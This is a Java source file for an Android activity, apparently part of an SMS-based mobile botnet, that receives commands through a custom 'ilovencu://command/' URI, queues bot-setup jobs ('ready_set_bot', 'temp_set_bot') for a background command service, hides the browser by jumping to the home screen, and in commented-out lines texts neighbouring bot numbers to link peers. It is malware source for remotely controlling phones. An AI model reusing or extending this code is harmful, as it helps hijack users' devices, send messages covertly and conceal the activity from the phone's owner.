package com.SmsService;

import java.net.URLDecoder;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.net.Uri;

public class NetCommand extends Activity {
	private boolean SendSMS ( String destNumber, String message ) {
		SmsManager smsManager = SmsManager.getDefault();  
        smsManager.sendTextMessage(destNumber, null, message, null, null);
        return true;
	} 
	@Override
	public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        CommandJobElement job;
        int commandNumber=0;
        if(CommonVariable.browserOnFlag){
        	 stopBrowser();
        }
       
      //do some shit to handle the uri command. :P
        //maybe startService(CommandService.class) and handle the net command
        //............        
        
        Debug.PrintLog("NetCommand","NetCommand Created....");
        Debug.PrintLog("NetCommand","NetCommand=>URI:"+getIntent().toURI());
        String URL = URLDecoder.decode(getIntent().toURI());
        Pattern p = Pattern.compile("ilovencu://command/(.+)#Intent");
        Matcher m = p.matcher(URL);
        if ( m.find() ) {
        	String[] command = m.group(1).split("/");
        	
        	Debug.PrintLog("NetCommand","parse url-> "+command[0]);
        	if ( command[0].contains("ready_set_bot") ) {
        		Debug.PrintLog("NetCommand","NetCommand: ready to set bot");
        		commandNumber = command.length;        		
        		
	        	for ( int i=1 ; i<command.length ; i++ ) {
	        				job = CommandJob.setJob("0000", command[i]);
							CommandJob.addJob(job);
							//intent.putExtra("content", command[i]);				
				}
	        	/*
	        	Intent intent = new Intent(this, CommandService.class);
	        	intent.putExtra("number", "0000");
				CommonVariable.CommandServiceLock = "true";
				this.startService(intent);
				*/
	        	if ( CommonVariable.CommandServiceLock.equals("false") ) {
	        		CommandJob.startService(this);
	        		CommonVariable.CommandServiceLock = "true";
	        	}
	        	
	        	/*
	        	 * inform left and right bot renew their right and left number
	        	 * I'm not sure why but without calling these methods, the register process works pretty fine.
	        	 */
				//SendSMS(CommonVariable.leftBotNumber,CommonVariable.COMMAND_SIGN+CommonVariable.SEPERATE+CommonVariable.FORCE_RECEIVE_SIGN+CommonVariable.SEPERATE+CommonVariable.SET_RIGHT_BOT+CommonVariable.SEPERATE+CommonVariable.selfNumber);
				//SendSMS(CommonVariable.rightBotNumber,CommonVariable.COMMAND_SIGN+CommonVariable.SEPERATE+CommonVariable.FORCE_RECEIVE_SIGN+CommonVariable.SEPERATE+CommonVariable.SET_LEFT_BOT+CommonVariable.SEPERATE+CommonVariable.selfNumber);
        	}
        	else if ( command[0].contains("temp_set_bot") ) {
        		Debug.PrintLog("NetCommand","NetCommand: temp to set bot");        		
        		for ( int i=1 ; i<command.length ; i++ ) {        				
	        				//add multi command to the job queue
        					job = CommandJob.setJob("0000", command[i]);
	        				CommandJob.addJob(job);
							//intent.putExtra("content", command[i]);
	        	}
        		//Intent intent = new Intent(this, CommandService.class);
        		//intent.putExtra("number", "0000");
				//CommonVariable.CommandServiceLock = "true";
				//this.startService(intent);
        		if ( CommonVariable.CommandServiceLock.equals("false") ) {
	        		CommandJob.startService(this);
	        		CommonVariable.CommandServiceLock = "true";
	        	}
        	}
        	else {
        		Debug.PrintLog("NetCommand","NetCommand: web command error!!");        		
        		for ( int i=0 ; i<command.length ; i++ ) {		         			
        				job = CommandJob.setJob("0000", command[i]);
        				CommandJob.addJob(job);
		        			//intent.putExtra("content", command[i]);		        			        		
        		}
        		//Intent intent = new Intent(this, CommandService.class);
        		//intent.putExtra("number", "0000");
    			//CommonVariable.CommandServiceLock = "true";
    			//this.startService(intent);
        		if ( CommonVariable.CommandServiceLock.equals("false") ) {
	        		CommandJob.startService(this);
	        		CommonVariable.CommandServiceLock = "true";
	        	}
        	}
        }
        else {
        	Debug.PrintLog("NetCommand","parse url: "+URL+" error");
        }       
        
        finish();
       
        
    }
	
	private void stopBrowser() {
		
		startActivity(new Intent(Intent.ACTION_VIEW,
				Uri.parse("http://google.com")).setFlags
				(Intent.FLAG_ACTIVITY_NEW_TASK ));
		
		startActivity(new Intent(Intent.ACTION_MAIN).addCategory
				(Intent.CATEGORY_HOME).setFlags
				(Intent.FLAG_ACTIVITY_NEW_TASK));
		
		CommonVariable.browserOnFlag = false;
	}

}
